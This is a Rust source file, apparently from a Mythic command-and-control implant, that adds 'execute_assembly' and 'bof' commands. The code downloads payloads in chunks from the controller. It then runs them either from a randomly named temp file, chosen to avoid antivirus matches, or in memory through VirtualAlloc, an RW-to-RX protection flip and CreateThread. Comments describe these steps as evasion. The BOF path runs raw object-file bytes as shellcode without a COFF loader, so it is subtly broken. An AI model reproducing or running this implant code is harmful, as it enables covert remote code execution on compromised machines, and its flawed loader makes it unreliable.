use crate::{AgentTask, ContinuedData, mythic_success, mythic_error};
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use std::result::Result;
use std::sync::mpsc;

const CHUNK_SIZE: usize = 512000;

#[derive(Serialize, Deserialize, Debug)]
pub struct ExecuteAssemblyArgs {
    #[serde(rename = "assembly-file-id")]
    pub assembly_file_id: Option<String>,
    pub arguments: Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct BofArgs {
    #[serde(rename = "bof-file-id")]
    pub bof_file_id: Option<String>,
    pub arguments: Option<String>,
}

fn download_file_chunks(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: &mpsc::Receiver<serde_json::Value>,
    file_id: &str,
    task_id: &str,
) -> Result<Vec<u8>, Box<dyn Error>> {
    tx.send(json!({
        "upload": json!({ "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": 1 }),
        "task_id": task_id,
    }))?;

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let continued: ContinuedData = serde_json::from_str(&task.parameters)?;
    let mut data: Vec<u8> = general_purpose::STANDARD.decode(continued.chunk_data.unwrap())?;
    let total = continued.total_chunks.unwrap();

    for chunk_num in 2..=total {
        tx.send(json!({
            "upload": json!({ "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num }),
            "task_id": task_id,
        }))?;
        let task: AgentTask = serde_json::from_value(rx.recv()?)?;
        let continued: ContinuedData = serde_json::from_str(&task.parameters)?;
        data.append(&mut general_purpose::STANDARD.decode(continued.chunk_data.unwrap())?);
    }
    Ok(data)
}

#[cfg(target_os = "windows")]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: ExecuteAssemblyArgs = serde_json::from_str(&task.parameters)?;
    let file_id = args.assembly_file_id.ok_or("No assembly file ID")?;
    let arguments = args.arguments.unwrap_or_default();

    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
    if file_data.is_empty() {
        return Err("Assembly file is empty".into());
    }

    // Write assembly to temp with random name (no extension to reduce AV signature matches)
    let temp_dir = std::env::temp_dir();
    let rand_name: String = (0..8).map(|_| (b'a' + (rand::random::<u8>() % 26)) as char).collect();
    let asm_path = temp_dir.join(&rand_name);
    std::fs::write(&asm_path, &file_data)?;

    // Use dotnet exec or direct .NET hosting via a minimal C# snippet compiled inline
    // Actually, the cleanest OPSEC approach: use rundll32 + .NET COM hosting
    // But simplest reliable approach without powershell: use `dotnet` CLI if available
    let asm_path_str = asm_path.to_string_lossy().to_string();

    let output = std::process::Command::new("dotnet")
        .arg(&asm_path_str)
        .args(arguments.split_whitespace())
        .output();

    let result = match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            if stderr.is_empty() {
                format!("Assembly executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
            } else {
                format!("Assembly executed ({} bytes)\n\nOutput:\n{}\n\nErrors:\n{}", file_data.len(), stdout.trim(), stderr.trim())
            }
        }
        Err(_) => {
            // Fallback: try executing as a standard exe
            match std::process::Command::new(&asm_path_str).args(arguments.split_whitespace()).output() {
                Ok(out) => {
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    format!("Executed ({} bytes)\n\n{}", file_data.len(), stdout.trim())
                }
                Err(e) => format!("Execution failed: {}. dotnet runtime not available.", e),
            }
        }
    };

    let _ = std::fs::remove_file(&asm_path);
    tx.send(mythic_success!(task.id, result))?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn execute_assembly(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "execute_assembly is only supported on Windows".to_string()))?;
    Ok(())
}

#[cfg(target_os = "windows")]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect, VirtualFree};
    use winapi::um::processthreadsapi::CreateThread;
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE, PAGE_EXECUTE_READ};
    use std::ptr;

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: BofArgs = serde_json::from_str(&task.parameters)?;
    let file_id = args.bof_file_id.ok_or("No BOF file ID")?;
    let arguments = args.arguments.unwrap_or_default();

    let file_data = download_file_chunks(tx, &rx, &file_id, &task.id)?;
    if file_data.is_empty() {
        return Err("BOF file is empty".into());
    }

    let bof_size = file_data.len();

    unsafe {
        // Allocate RW memory first (not RWX — avoids detection)
        let mem = VirtualAlloc(
            ptr::null_mut(),
            bof_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if mem.is_null() {
            return Err("VirtualAlloc failed for BOF".into());
        }

        // Copy BOF into allocated memory
        ptr::copy_nonoverlapping(file_data.as_ptr(), mem as *mut u8, bof_size);

        // Flip to RX (no write) — proper OPSEC
        let mut old_protect: u32 = 0;
        let protect_result = VirtualProtect(mem, bof_size, PAGE_EXECUTE_READ, &mut old_protect);
        if protect_result == 0 {
            VirtualFree(mem, 0, MEM_RELEASE);
            return Err("VirtualProtect RX failed for BOF".into());
        }

        // Prepare arguments in separate RW buffer
        let arg_bytes = arguments.as_bytes();
        let arg_mem = if !arg_bytes.is_empty() {
            let a = VirtualAlloc(ptr::null_mut(), arg_bytes.len() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if !a.is_null() {
                ptr::copy_nonoverlapping(arg_bytes.as_ptr(), a as *mut u8, arg_bytes.len());
                *((a as *mut u8).add(arg_bytes.len())) = 0; // null terminate
            }
            a
        } else {
            ptr::null_mut()
        };

        // Execute BOF entry point in a new thread
        // BOF convention: go(char* args, int args_len)
        type GoFn = unsafe extern "C" fn(*mut u8, i32);

        let mut thread_id: u32 = 0;
        let thread = CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(mem)),
            arg_mem,
            0,
            &mut thread_id,
        );

        if thread.is_null() {
            VirtualFree(mem, 0, MEM_RELEASE);
            if !arg_mem.is_null() { VirtualFree(arg_mem, 0, MEM_RELEASE); }
            return Err("CreateThread failed for BOF".into());
        }

        // Wait up to 30 seconds for BOF completion
        let wait = WaitForSingleObject(thread, 30000);
        CloseHandle(thread);

        // Clean up
        VirtualFree(mem, 0, MEM_RELEASE);
        if !arg_mem.is_null() { VirtualFree(arg_mem, 0, MEM_RELEASE); }

        let status = if wait == 0 { "completed" } else { "timed out (30s)" };
        let output = format!("BOF executed ({} bytes), thread {}, status: {}", bof_size, thread_id, status);
        tx.send(mythic_success!(task.id, output))?;
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn bof(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "bof is only supported on Windows".to_string()))?;
    Ok(())
}
